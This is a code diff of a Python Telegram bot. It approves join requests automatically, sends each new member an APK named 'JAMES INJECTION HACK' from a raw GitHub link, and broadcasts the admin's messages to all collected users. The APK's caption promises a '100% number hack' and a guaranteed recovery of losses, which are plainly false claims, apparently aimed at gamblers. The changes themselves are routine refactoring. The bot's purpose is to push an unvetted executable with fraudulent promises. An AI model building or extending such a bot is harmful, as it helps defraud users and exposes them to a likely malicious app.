@@ -1,28 +1,23 @@
 import os
-import logging
 import asyncio
 from flask import Flask, request
 from telegram import Update
 from telegram.ext import (
-    Application,
+    ApplicationBuilder,
     ChatJoinRequestHandler,
     MessageHandler,
     ContextTypes,
     filters,
 )
 
-# 🔥 ENV
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = int(os.getenv("ADMIN_ID"))
 
-# 🔥 USERS
+app = Flask(__name__)
+
 users = set()
 
-# 🔥 APK
-APK_LINK = "https://raw.githubusercontent.com/loda26616-a11y/JAMES-/1db4bc6a4a7b78311162a7c798e49147eaa4a3e7/JAMES%20INJECTION%20HACK_1.0_0%20(1).apk"
-
-APK_CAPTION = """
-✅ 100% NUMBER HACK 💥
+APK_CAPTION = """✅ 100% NUMBER HACK 💥
 
 ( ONLY FOR PREMIUM USERS ⚡️ )
 ( 100% LOSS RECOVER GUARANTEE ⚡️ )
@@ -32,14 +27,10 @@ APK_CAPTION = """
 FOR HELP @M4JAMES_HACK_MANAGER
 """
 
-# 🔥 LOG
-logging.basicConfig(level=logging.INFO)
+APK_LINK = "https://raw.githubusercontent.com/loda26616-a11y/JAMES-/1db4bc6a4a7b78311162a7c798e49147eaa4a3e7/JAMES%20INJECTION%20HACK_1.0_0%20(1).apk"
 
-# 🔥 FLASK
-app = Flask(__name__)
-
-# 🔥 TELEGRAM APP
-application = Application.builder().token(BOT_TOKEN).build()
+# ✅ BOT INIT
+application = ApplicationBuilder().token(BOT_TOKEN).build()
 
 
 # ✅ JOIN REQUEST
@@ -63,10 +54,8 @@ async def approve_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
             caption=APK_CAPTION
         )
 
-        print(f"Approved: {user.id}")
-
     except Exception as e:
-        print(f"Join Error: {e}")
+        print("Join Error:", e)
 
 
 # ✅ BROADCAST
@@ -83,47 +72,27 @@ async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     message_id=update.message.id
                 )
             except Exception as e:
-                print(f"Broadcast Error: {e}")
+                print("Broadcast error:", e)
 
     except Exception as e:
-        print(f"Broadcast Main Error: {e}")
+        print("Broadcast main error:", e)
 
 
-# ✅ ERROR HANDLER
-async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
-    print(f"ERROR: {context.error}")
-
-
-# 🔥 ADD HANDLERS
+# ✅ HANDLERS
 application.add_handler(ChatJoinRequestHandler(approve_request))
 application.add_handler(MessageHandler(filters.ALL, broadcast))
-application.add_error_handler(error_handler)
 
 
 # ✅ WEBHOOK ROUTE
-@app.route("/webhook", methods=["POST"])
+@app.route("/", methods=["POST"])
 def webhook():
     update = Update.de_json(request.get_json(force=True), application.bot)
-    application.update_queue.put_nowait(update)
+    asyncio.run(application.process_update(update))
     return "ok"
 
 
-# ✅ HOME ROUTE
-@app.route("/")
-def home():
-    return "Bot running 🚀"
-
-
-# 🔥 START BOT (ASYNC FIXED)
-async def start_bot():
-    await application.initialize()
-    await application.start()
-
-
-# 🔥 MAIN
+# ✅ START APP
 if __name__ == "__main__":
     PORT = int(os.environ.get("PORT", 10000))
-
-    asyncio.get_event_loop().run_until_complete(start_bot())
-
+    print("Bot running on port", PORT)
     app.run(host="0.0.0.0", port=PORT)
